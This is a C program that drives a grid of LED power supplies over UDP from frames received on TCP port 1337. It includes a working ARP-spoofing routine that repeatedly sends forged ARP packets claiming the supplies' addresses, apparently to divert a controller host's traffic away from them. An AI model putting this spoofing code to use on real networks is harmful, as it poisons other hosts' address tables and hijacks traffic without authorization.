
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <event2/event.h>
#include <event2/bufferevent.h>
#include <event2/listener.h>
#include <stdint.h>
#include <string.h>
#include <linux/sockios.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>

#define LISTEN_PORT 1337
#define BOARD_WIDTH 57
#define BOARD_HEIGHT 44
#define NUM_PSUS 8
#define PSU_DEST_PORT 6038
#define ARP_SPOOF_IFACE "eth1"


// From linux/if_arp.h
struct arphdr_eth {
    __be16      ar_hrd;     /* format of hardware address   */
    __be16      ar_pro;     /* format of protocol address   */
    unsigned char   ar_hln;     /* length of hardware address   */
    unsigned char   ar_pln;     /* length of protocol address   */
    __be16      ar_op;      /* ARP opcode (command)     */

     /*
      *  Ethernet looks like this : This bit is variable sized however...
      */
    unsigned char       ar_sha[ETH_ALEN];   /* sender hardware address  */
    unsigned char       ar_sip[4];      /* sender IP address        */
    unsigned char       ar_tha[ETH_ALEN];   /* target hardware address  */
    unsigned char       ar_tip[4];      /* target IP address        */

};


char *ip_addrs[] = {"10.4.135.141", "10.4.163.250", "10.4.132.113",
                    "10.4.57.133", "10.4.57.120", "10.4.57.134",
                    "10.4.57.131", "10.4.57.127"};

int psu_lengths[] = {8, 7, 7, 7, 7, 7, 7, 7};

int diag_gap[] = {
45, 45, 45, 44, 44, 43, 42, 41,
41, 40, 39, 38, 38, 37, 36,
35, 35, 34, 33, 32, 31, 31,   // TODO: check these values <--
30, 29, 28, 28, 27, 26, 25,
25, 24, 23, 22, 21, 21, 20,
19, 18, 17, 17, 16, 15, 14,
13, 13, 12, 11, 10,  10,  9,
 8,  7,  6,  6,  5,  4,  3};

uint8_t psu_hdr_data[] = {0x04, 0x01, 0xdc, 0x4a, 0x01, 0x00, 0x08, 0x01, 0x00};

struct psu_flags {
    uint8_t x;
    uint8_t y;
    uint8_t z;
} __attribute__((packed));

struct psu_flags psu_hdr_flags[] = {
    {0x00, 0xf0, 0xff},
    {0x00, 0x00, 0x00},
    {0x00, 0x00, 0x00},     // TODO: check these values too <--
    {0x00, 0x00, 0x00},
    {0x00, 0x00, 0x00},
    {0x00, 0x00, 0x00},
    {0x00, 0x00, 0x00},
    {0x00, 0x00, 0x00}};


struct rgb {
    uint8_t r;
    uint8_t g;
    uint8_t b;
} __attribute__((packed));


struct psu_pkt {
    uint8_t             head[9];    // unknown purpose, always 0401dc4a0100080100
    uint32_t            zeros;
    uint32_t            strand_id;
    uint32_t            bulbs_length;
    struct psu_flags    flags; // PSU specific?

    struct rgb          bulbs[BOARD_HEIGHT+1];
} __attribute__((packed));


struct state_st
{
    int                 udp_sock;
    int                 raw_sock;   // for arp spoofing
    int                 if_idx;     // interface index to arp spoof on
    struct sockaddr_in  psu_sin[NUM_PSUS];

    // Stats
    uint32_t            frame_updates;

};

void init_psus(struct state_st *st)
{
    int i;
    int port = PSU_DEST_PORT;
    for (i=0; i<NUM_PSUS; i++) {
        st->psu_sin[i].sin_family = AF_INET;
        st->psu_sin[i].sin_port = htons(port);
        inet_aton(ip_addrs[i], &st->psu_sin[i].sin_addr);
    }
}

void update_strands(struct state_st *state, char *buf)
{
    int i;  // psu_id
    struct rgb *p = (struct rgb *)buf;
    int strand_idx = 0;
    int j;

    for (i=0; i<NUM_PSUS; i++) {
        // Each PSU has {8,7} strands:
        for (j=0; j<psu_lengths[i]; j++) {
            // For each strand
            struct psu_pkt pkt;
            size_t pkt_len = sizeof(pkt);
            int bulb_len = 44;
            int gap = (diag_gap[strand_idx++] - 1);
            memcpy(pkt.head, psu_hdr_data, 9);
            pkt.zeros = 0;
            pkt.strand_id = ntohl(psu_lengths[i] - j);

            if (gap < BOARD_HEIGHT) {
                // Account for inserted element
                pkt.bulbs_length = ntohl(sizeof(struct rgb)*(BOARD_HEIGHT + 1));

                // Copy bulbs before gap
                memcpy(pkt.bulbs, p, gap*sizeof(struct rgb));
                p += gap;

                // Gap
                memset(&pkt.bulbs[gap], 0, sizeof(struct rgb));

                // Bulbs after gap
                memcpy(&pkt.bulbs[gap+1], p, (BOARD_HEIGHT - gap)*sizeof(struct rgb));
                p += (BOARD_HEIGHT - gap);
            } else {
                pkt.bulbs_length = ntohl(sizeof(struct rgb)*BOARD_HEIGHT);
                pkt_len -= sizeof(struct rgb);

                memcpy(pkt.bulbs, p, BOARD_HEIGHT*sizeof(struct rgb));
                p += BOARD_HEIGHT;
            }

            memcpy(&pkt.flags, &psu_hdr_flags[i], sizeof(struct psu_flags));

            sendto(state->udp_sock, &pkt, pkt_len, 0,
                   (struct sockaddr*)&state->psu_sin[i], sizeof(struct sockaddr_in));

        }
    }
}

void read_cb(struct bufferevent *bev, void *arg)
{
    struct state_st *state = arg;
    char buf[BOARD_WIDTH*BOARD_HEIGHT*3];
    struct evbuffer *input = bufferevent_get_input(bev);
    int had_input = 0;

    // TODO: use math and evbuffer_drain to save on copying
    while (evbuffer_get_length(input) >= sizeof(buf)) {
        evbuffer_remove(input, buf, sizeof(buf));
        update_strands(state, buf);

        state->frame_updates++;
        had_input = 1;
    }
}

int send_arp(int sock, int if_idx, unsigned char *src_mac, char *src_ip, char *dst_ip)
{
    struct arphdr_eth *arp;
    struct ethhdr *eth;
    struct sockaddr_ll sll;

    char buf[sizeof(*arp)+sizeof(*eth)];

    eth = (struct ethhdr*)buf;
    arp = (struct arphdr_eth*)(eth+1);

    arp->ar_hrd = ntohs(ARPHRD_ETHER);
    arp->ar_pro = ntohs(ETH_P_IP);
    arp->ar_hln = ETH_ALEN;
    arp->ar_pln = 4;
    arp->ar_op = ntohs(ARPOP_REQUEST);
    memcpy(arp->ar_sha, src_mac, ETH_ALEN);
    inet_aton(src_ip, arp->ar_sip);
    memset(arp->ar_tha, 0, ETH_ALEN);
    inet_aton(dst_ip, arp->ar_tip);

    memcpy(eth->h_dest, "\xff\xff\xff\xff\xff\xff", ETH_ALEN);
    memcpy(eth->h_source, src_mac, ETH_ALEN);

    eth->h_proto = ntohs(ETH_P_ARP);

    sll.sll_ifindex = if_idx;
    sll.sll_halen = ETH_ALEN;
    memcpy(sll.sll_addr, "\xff\xff\xff\xff\xff\xff", ETH_ALEN);

    return sendto(sock, buf, sizeof(buf), 0,
           (struct sockaddr*)&sll, sizeof(struct sockaddr_ll));

}

void arp_spoof(struct state_st *state)
{
    char *tip = "10.1.3.100";
    char *src_mac = "\x00\x11\x22\x33\x44\x55";

    send_arp(state->raw_sock, state->if_idx, src_mac, "10.4.57.127", tip);
    send_arp(state->raw_sock, state->if_idx, src_mac, "10.4.57.131", tip);
    send_arp(state->raw_sock, state->if_idx, src_mac, "10.4.57.134", tip);
    send_arp(state->raw_sock, state->if_idx, src_mac, "10.4.57.120", tip);
    send_arp(state->raw_sock, state->if_idx, src_mac, "10.4.57.133", tip);
    send_arp(state->raw_sock, state->if_idx, src_mac, "10.4.132.113", tip);
    send_arp(state->raw_sock, state->if_idx, src_mac, "10.4.135.141", tip);
    send_arp(state->raw_sock, state->if_idx, src_mac, "10.4.163.250", tip);
}

void status_cb(evutil_socket_t fd, short what, void *arg)
{
    struct state_st *state = arg;
    if (state->frame_updates > 0) {
        arp_spoof(state);
    }

    printf("%d frames/sec\n", state->frame_updates);

    state->frame_updates = 0;
}


void accept_conn_cb(struct evconnlistener *listener,
    evutil_socket_t fd, struct sockaddr *address, int socklen,
    void *arg)
{
        struct state_st *state = arg;
        struct event_base *base = evconnlistener_get_base(listener);
        struct bufferevent *bev = bufferevent_socket_new(
                base, fd, BEV_OPT_CLOSE_ON_FREE);

        bufferevent_setcb(bev, read_cb, NULL, NULL, state);

        bufferevent_enable(bev, EV_READ|EV_WRITE);
}


int main(int argc, char *argv[])
{

    struct event_base *base;
    int sock;
    int port = LISTEN_PORT;
    struct sockaddr_in sin;
    struct state_st state;
    struct evconnlistener *listener;
    struct event *ev;
    struct ifreq if_idx;

    memset(&state, 0, sizeof(state));
    memset(&sin, 0, sizeof(sin));

    base = event_base_new();

    init_psus(&state);

    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    state.udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (state.udp_sock < 0) {
        perror("socket");
        return -1;
    }

    state.raw_sock = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
    if (state.raw_sock < 0) {
        perror("socket");
        return -1;
    }

    memset(&if_idx, 0, sizeof(struct ifreq));
    strncpy(if_idx.ifr_name, ARP_SPOOF_IFACE, IFNAMSIZ-1);
    if (ioctl(state.raw_sock, SIOCGIFINDEX, &if_idx) < 0) {
        perror("SIOCGIFINDEX");
        return -1;
    }
    state.if_idx = if_idx.ifr_ifindex;



    listener = evconnlistener_new_bind(base, accept_conn_cb, &state,
            LEV_OPT_CLOSE_ON_FREE|LEV_OPT_REUSEABLE, -1,
            (struct sockaddr*)&sin, sizeof(sin));


    struct timeval one_sec = {1, 0};
    ev = event_new(base, 0, EV_PERSIST, status_cb, &state);
    event_add(ev, &one_sec);

    event_base_dispatch(base);

    return 0;
}

